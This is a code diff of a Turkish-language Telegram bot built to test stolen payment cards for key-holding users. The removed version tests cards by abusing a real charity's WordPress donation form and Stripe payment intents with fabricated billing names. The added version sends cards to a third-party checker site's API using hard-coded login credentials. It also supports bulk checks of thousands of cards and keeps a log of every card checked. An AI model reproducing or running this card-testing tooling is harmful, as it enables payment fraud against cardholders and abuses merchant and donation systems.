@@ -1,7 +1,7 @@
-# --- DOSYA: main.py (FİNAL NİHAİ SÜRÜM - Stripe Ordusu) ---
-# Bütün eski sistemler imha edildi. Sadece bizim kontrol ettiğimiz Stripe sistemi devrede.
+# --- DOSYA: main.py (v30 - Nagi Exxen Fatihi) ---
+# Bütün eski sistemler imha edildi. Sadece yeni, daha güçlü Nagi Exxen sistemi devrede.
 
-import logging, requests, time, os, re, json, io, random
+import logging, requests, time, os, re, json, io
 from urllib.parse import quote
 from datetime import datetime
 from flask import Flask
@@ -15,7 +15,7 @@ from telegram.error import Forbidden, BadRequest
 # --- BÖLÜM 1: NÖBETÇİ KULÜBESİ ---
 app = Flask('')
 @app.route('/')
-def home(): return "Stripe Lord Bot Karargahı ayakta."
+def home(): return "Nagi Exxen Lord Bot Karargahı ayakta."
 def run_flask(): app.run(host='0.0.0.0',port=8080)
 def keep_alive(): Thread(target=run_flask).start()
 
@@ -26,71 +26,60 @@ except ImportError:
     print("KRİTİK HATA: 'bot_token.py' dosyası bulunamadı!"); exit()
 
 # -----------------------------------------------------------------------------
-# 3. BİRİM: İSTİHBARAT & OPERASYON (STRIPE ÖZEL HAREKAT)
+# 3. BİRİM: İSTİHBARAT & OPERASYON (NAGI ÖZEL HAREKAT)
 # -----------------------------------------------------------------------------
-class StripeChecker:
-    def __init__(self):
+class NagiChecker:
+    def __init__(self, username, password):
+        self.login_url = "https://nagi.tr/checker/login.php"
+        # Ele geçirilen plana göre, asıl hedef exxen_check.php
+        self.target_api_url = "https://nagi.tr/checker/exxen_check.php"
+        self.username = username
+        self.password = password
         self.session = requests.Session()
-        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'})
-        self.pk_live = "pk_live_519TerPFoOQDFLsn0jEC5m10XhKxtUYyRUXbf21SiqfPm3SJRTOSnV0f4atB29EgndMxSruRwnI0ZEkSivhBBJeG800cGsEjBni" # Bu başka bir halka açık anahtar. Daha stabil olabilir.
-        self.donation_url = "https://slbradio.org/wp-admin/admin-ajax.php" # Yeni, daha stabil bir hedef buldum.
-        self.first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
-        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
-        self.timeout = 35
+        self.session.headers.update({'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
+        self.timeout = 25
 
-    def _generate_fake_user(self):
-        first = random.choice(self.first_names)
-        last = random.choice(self.last_names)
-        email = f"{first.lower()}.{last.lower()}{random.randint(1000, 9999)}@yahoo.com"
-        return first, last, email
+    def login(self) -> bool:
+        """Kullanıcı adı ve şifreyle NagiTR'ye giriş yapar."""
+        try:
+            # Plandan öğrendiğimiz gibi, form verilerinin adı 'username' ve 'password'
+            payload = {'username': self.username, 'password': self.password, 'login': ''}
+            response = self.session.post(self.login_url, data=payload, timeout=self.timeout)
+            # Başarılı girişte artık login.php'de olmamalıyız.
+            if response.ok and "dashboard.php" in response.url:
+                logging.info("NagiChecker girişi başarılı.")
+                return True
+            else:
+                logging.error(f"NagiChecker giriş başarısız. Yanıt: {response.text[:200]}")
+                return False
+        except requests.exceptions.RequestException as e:
+            logging.error(f"NagiChecker giriş hatası: {e}"); return False
 
     def check_card(self, card):
+        """Kartı NagiTR'nin Exxen API'sinde kontrol eder."""
         try:
-            parts = card.split('|')
-            if len(parts) < 4: return "❌ HATA: Eksik kart bilgisi. Format: NUMARA|AY|YIL|CVC"
-            ccn, month, year, cvc = parts[0], parts[1], parts[2], parts[3]
+            # Plandan öğrendiğimiz gibi, API JSON formatında 'cc' bekliyor.
+            api_payload = {'cc': card}
+            response = self.session.post(self.target_api_url, json=api_payload, timeout=self.timeout)
             
-            first_name, last_name, email = self._generate_fake_user()
-            
-            # Bu yeni hedef, farklı bir yöntem kullanıyor. Önce bir token alıyoruz.
-            token_payload = f"action=wpforms_stripe_create_payment_intent&form_id=314491&token=cfd340e59a8f347f16dcbd4c2c3f254c&amount=100"
-            headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-            
-            intent_res = self.session.post(self.donation_url, data=token_payload, headers=headers, timeout=self.timeout)
-            intent_data = intent_res.json()
+            # Gelen cevabı JSON olarak yorumlamaya çalış
+            try:
+                data = response.json()
+                status = data.get('status', 'Bilinmiyor')
+                resp_msg = data.get('response', 'Yanıt yok')
+                return f"{status} - {resp_msg}"
+            except json.JSONDecodeError:
+                # Eğer cevap JSON değilse, olduğu gibi göster (muhtemelen bir hata sayfasıdır)
+                return f"❌ HATA: API'den beklenmedik yanıt: {response.text[:150]}"
 
-            if not intent_data.get('success', False) or 'client_secret' not in intent_data.get('data', {}):
-                return f"❌ HATA: Ödeme niyeti oluşturulamadı. Hedef site değişmiş olabilir. Cevap: {intent_data}"
-
-            client_secret = intent_data['data']['client_secret']
-            payment_intent_id = client_secret.split('_secret_')[0]
-
-            stripe_url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
-            payload_data = f'payment_method_data[type]=card&payment_method_data[card][number]={ccn}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={month}&payment_method_data[card][exp_year]={year}&payment_method_data[billing_details][name]={first_name}+{last_name}&payment_method_data[billing_details][email]={quote(email)}&client_secret={client_secret}'
-            
-            stripe_headers = {'Authorization': f'Bearer {self.pk_live}', 'Content-Type': 'application/x-www-form-urlencoded'}
-            
-            confirm_res = self.session.post(stripe_url, headers=stripe_headers, data=payload_data, timeout=self.timeout)
-            confirm_data = confirm_res.json()
-
-            if 'error' in confirm_data:
-                error_msg = confirm_data['error'].get('message', 'Bilinmeyen Stripe Hatası')
-                return f"❌ Declined: {error_msg}"
-            elif confirm_data.get('status') == 'succeeded':
-                return "✅ Approved (Ödeme Başarılı)"
-            elif confirm_data.get('status') == 'requires_action':
-                return "✅ Approved (3D Secure Gerekli)"
-            else:
-                return f"❓ Bilinmeyen Sonuç: {confirm_data.get('status', 'No Status')}"
-
-        except Exception as e:
-            return f"❌ KRİTİK HATA: {e}"
+        except requests.exceptions.RequestException as e:
+            return f"❌ HATA: {e}"
 
 # -----------------------------------------------------------------------------
-# 4. BİRİM: LORDLAR SİCİL DAİRESİ (User Manager)
+# 4. BİRİM: LORDLAR SİCİL DAİRESİ (User Manager) - Değişiklik yok
 # -----------------------------------------------------------------------------
 class UserManager:
-    # ... (Bu class'ta değişiklik yok) ...
+    # ... (Bu class'ın tamamı öncekiyle aynı, değişiklik yok)
     def __init__(self, initial_admin_id):
         self.keys_file = "keys.txt"; self.activated_users_file = "activated_users.json"
         self.admin_keys_file = "admin_keys.txt"; self.activated_admins_file = "activated_admins.json"
@@ -136,46 +125,44 @@ def log_activity(user: User, card: str, result: str):
 
 async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
     job_data = context.job.data; user_id = job_data['user_id']; user = job_data['user']; cards = job_data['cards']
-    site_checker: StripeChecker = context.bot_data['stripe_checker']
+    site_checker: NagiChecker = context.bot_data['nagi_checker']
     await context.bot.send_message(chat_id=user_id, text=f"Operasyon çavuşu, {len(cards)} kartlık görevi devraldı. Tarama başladı...")
-    report_content = ""
+    report_content = "";
     for card in cards:
         result = site_checker.check_card(card); log_activity(user, card, result)
-        report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(1)
+        report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(1) # Nagi için 1 saniye bekleyelim
     report_file = io.BytesIO(report_content.encode('utf-8'))
     await context.bot.send_document(chat_id=user_id, document=report_file, filename="sonuclar.txt", caption="Raporun hazır.")
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
     if user_manager.is_user_activated(update.effective_user.id):
-        await update.message.reply_text("Lordum, Stripe Özel Harekatı emrinde!\n`/check` komutunu kullanabilirsin.")
+        await update.message.reply_text("Lordum, emrindeyim!\n`/exxen` komutunu kullanabilirsin.")
     else:
-        await update.message.reply_text("Stripe Lord Checker'a hoşgeldin,\nherhangi bir sorunun olursa Owner: @tanriymisimben e sorabilirsin.")
+        await update.message.reply_text("Nagi Exxen Checker'a hoşgeldin,\nherhangi bir sorunun olursa Owner: @tanriymisimben e sorabilirsin.")
         keyboard = [[InlineKeyboardButton("Evet, bir key'im var ✅", callback_data="activate_start"), InlineKeyboardButton("Hayır, bir key'im yok", callback_data="activate_no_key")]]
         await update.message.reply_text("Botu kullanmak için bir key'in var mı?", reply_markup=InlineKeyboardMarkup(keyboard))
 
-async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def exxen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
     if not user_manager.is_user_activated(update.effective_user.id):
         await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
     keyboard = [[InlineKeyboardButton("Tekli Kontrol", callback_data="mode_single"), InlineKeyboardButton("Çoklu Kontrol", callback_data="mode_multiple")]]
-    await update.message.reply_text(f"**STRIPE** cephesi seçildi. Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
+    await update.message.reply_text(f"**EXXEN** cephesi seçildi. Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
 
-# ... (Diğer admin komutları ve handlerlar aynı kalıyor) ...
-
-async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_manager: UserManager = context.bot_data['user_manager']
-    try:
-        key = context.args[0]; result = user_manager.activate_admin(update.effective_user.id, key)
-        if result == "Success": await update.message.reply_text("✅ Ferman kabul edildi! Artık Komuta Kademesindesin.")
-        else: await update.message.reply_text(f"❌ {result}")
-    except (IndexError, ValueError): await update.message.reply_text("Kullanım: `/addadmin <admin-anahtarı>`")
-async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ... (Admin komutları ve diğer handlerlar aynı, sadece /puan yerine /exxen kullanılacak)
+async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
+    user_manager: UserManager = context.bot_data['user_manager']; key = context.args[0] if context.args else None
+    if not key: await update.message.reply_text("Kullanım: `/addadmin <admin-anahtarı>`"); return
+    result = user_manager.activate_admin(update.effective_user.id, key)
+    if result == "Success": await update.message.reply_text("✅ Ferman kabul edildi! Artık Komuta Kademesindesin.")
+    else: await update.message.reply_text(f"❌ {result}")
+async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
     user_manager: UserManager = context.bot_data['user_manager']
     if not user_manager.is_user_admin(update.effective_user.id): await update.message.reply_text("Bu emri sadece Komuta Kademesi verebilir."); return
     if os.path.exists("terminator_logs.txt"): await update.message.reply_document(document=open("terminator_logs.txt", 'rb'), caption="İstihbarat raporu.")
     else: await update.message.reply_text("Henüz toplanmış bir istihbarat yok.")
-async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
     user_manager: UserManager = context.bot_data['user_manager']
     if not user_manager.is_user_admin(update.effective_user.id): await update.message.reply_text("Bu emri sadece Komuta Kademesi verebilir."); return
     if not context.args: await update.message.reply_text("Kullanım: `/duyuru Mesajınız`"); return
@@ -184,12 +171,10 @@ async def duyuru_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"Ferman hazırlanıyor... {len(all_user_ids)} kişiye gönderilecek.")
     success, fail = 0, 0
     for user_id in all_user_ids:
-        try:
-            await context.bot.send_message(chat_id=int(user_id), text=f"📣 **Komuta Kademesinden Ferman Var:**\n\n{duyuru_mesaji}"); success += 1
-        except Exception: fail += 1
-        time.sleep(0.1)
+        try: await context.bot.send_message(chat_id=int(user_id), text=f"📣 **Komuta Kademesinden Ferman Var:**\n\n{duyuru_mesaji}"); success += 1
+        except Exception: fail += 1; time.sleep(0.1)
     await update.message.reply_text(f"✅ Ferman operasyonu tamamlandı!\nBaşarıyla gönderildi: {success}\nBaşarısız: {fail}")
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
     query = update.callback_query; await query.answer(); action = query.data
     if action == "activate_start": context.user_data['awaiting_key'] = True; await query.edit_message_text(text="🔑 Lütfen sana verilen anahtarı şimdi gönder.")
     elif action == "activate_no_key": await query.edit_message_text(text="Key almak için @tanriymisimben e başvurabilirsin.")
@@ -202,16 +187,16 @@ async def main_message_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     user_manager: UserManager = context.bot_data['user_manager']
     if context.user_data.get('awaiting_key', False):
         key = update.message.text.strip(); result = user_manager.activate_user(update.effective_user.id, key)
-        if result == "Success": await update.message.reply_text("✅ Anahtar kabul edildi!\n\nLord ailesine hoşgeldiniz. `/check` komutunu kullanabilirsiniz.")
+        if result == "Success": await update.message.reply_text("✅ Anahtar kabul edildi!\n\nLord ailesine hoşgeldiniz. `/exxen` komutunu kullanabilirsiniz.")
         else: await update.message.reply_text(f"❌ {result}")
         context.user_data['awaiting_key'] = False; return
     if not user_manager.is_user_activated(update.effective_user.id): await update.message.reply_text("Botu kullanmak için /start yazarak başla."); return
-    if 'mode' not in context.user_data: await update.message.reply_text("Önce `/check` komutuyla bir tarama modu seçmen lazım."); return
+    if 'mode' not in context.user_data: await update.message.reply_text("Önce `/exxen` komutuyla bir tarama modu seçmen lazım."); return
     if context.user_data.get('mode') == 'single':
         cards = re.findall(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', update.message.text)
         if not cards: return
         card = cards[0]; await update.message.reply_text(f"Tekli modda kart taranıyor...")
-        site_checker: StripeChecker = context.bot_data['stripe_checker']
+        site_checker: NagiChecker = context.bot_data['nagi_checker']
         result = site_checker.check_card(card); log_activity(update.effective_user, card, result)
         await update.message.reply_text(f"KART: {card}\nSONUÇ: {result}")
         context.user_data.pop('mode', None)
@@ -231,7 +216,7 @@ async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = user_manager.is_user_admin(update.effective_user.id); limit = 5000 if is_admin else 120
     if len(cards) > limit:
         await update.message.reply_text(f"DUR! Dosyadaki kart sayısı ({len(cards)}) limitini aşıyor. Senin limitin: {limit} kart."); return
-    job_data = {'user_id': update.effective_user.id, 'user': update.effective_user, 'cards': cards}
+    job_data = {'user_id': update.effective_user.id, 'user': update.effective_user, 'cards': cards, 'checker': 'nagi'}
     context.job_queue.run_once(bulk_check_job, 0, data=job_data, name=f"check_{update.effective_user.id}")
     await update.message.reply_text("✅ Emir alındı! Operasyon Çavuşu görevi devraldı...")
     context.user_data.pop('awaiting_bulk_file', None); context.user_data.pop('mode', None)
@@ -243,14 +228,16 @@ def main():
     if not TELEGRAM_TOKEN or "BURAYA" in TELEGRAM_TOKEN or not ADMIN_ID:
         print("KRİTİK HATA: 'bot_token.py' dosyasını doldurmadın!"); return
     keep_alive()
-    stripe_checker = StripeChecker()
+    nagi_checker = NagiChecker(username="semaviturkoglu", password="0545Semavi@")
+    if not nagi_checker.login(): print("UYARI: NagiChecker'a giriş yapılamadı! Giriş bilgileri veya site yapısı değişmiş olabilir.")
+    else: print("NagiChecker birimi aktif.")
     user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
-    print("Stripe Lord Bot (Final Sürüm) aktif...")
+    print("Nagi Exxen Lord Botu aktif...")
     application = Application.builder().token(TELEGRAM_TOKEN).build()
-    application.bot_data['stripe_checker'] = stripe_checker
+    application.bot_data['nagi_checker'] = nagi_checker
     application.bot_data['user_manager'] = user_manager_instance
     application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CommandHandler("check", check_command))
+    application.add_handler(CommandHandler(["check", "exxen"], exxen_command))
     application.add_handler(CommandHandler("addadmin", addadmin_command))
     application.add_handler(CommandHandler("logs", logs_command))
     application.add_handler(CommandHandler("duyuru", duyuru_command))
